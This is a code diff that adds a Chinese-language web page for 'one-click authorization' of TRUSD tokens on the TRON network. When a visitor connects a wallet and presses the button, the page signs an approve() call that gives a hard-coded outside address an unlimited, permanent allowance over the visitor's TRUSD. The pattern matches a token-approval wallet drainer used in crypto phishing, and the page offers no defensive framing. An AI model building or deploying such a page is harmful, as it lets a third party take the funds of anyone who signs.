@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="zh-Hant">
+<head>
+<meta charset="UTF-8" />
+<title>TRUSD 一鍵授權</title>
+<script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.min.js"></script>
+</head>
+<body>
+<h2>TRUSD (TRC-20) 一鍵授權頁面</h2>
+<p>請連接你的錢包，點擊授權按鈕，授權 A 錢包永久管理你的 TRUSD。</p>
+<button id="approveBtn">一鍵授權</button>
+<p id="status"></p>
+
+<script>
+  const TRUSD_CONTRACT = "TUpMhErZL2fhh4sVNULAbNKLokS4GjC1F4"; // TRUSD TRC-20 合約地址
+  const A_ADDRESS = "TKnC8zjqnb2Bmadd2ibNnLswZwp67zyi26";      // 你提供的 A 錢包地址
+  const INFINITE_AMOUNT = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"; // 2^256-1
+
+  let tronWeb;
+
+  async function checkTronWeb() {
+    if (window.tronWeb && window.tronWeb.ready) {
+      tronWeb = window.tronWeb;
+      document.getElementById("status").innerText = "錢包已連接：" + tronWeb.defaultAddress.base58;
+      return true;
+    } else {
+      document.getElementById("status").innerText = "請先安裝 TronLink / 幣安 Web3 / Trust Wallet 並連接錢包";
+      return false;
+    }
+  }
+
+  async function approve() {
+    if (!await checkTronWeb()) return;
+
+    const contract = await tronWeb.contract().at(TRUSD_CONTRACT);
+
+    try {
+      document.getElementById("status").innerText = "發送授權交易中，請簽名...";
+      const tx = await contract.approve(A_ADDRESS, INFINITE_AMOUNT).send();
+
+      document.getElementById("status").innerText = "授權成功，交易ID：" + tx;
+    } catch (error) {
+      console.error(error);
+      document.getElementById("status").innerText = "授權失敗或用戶取消";
+    }
+  }
+
+  document.getElementById("approveBtn").onclick = approve;
+</script>
+</body>
+</html>
+Add TRUSD approve page
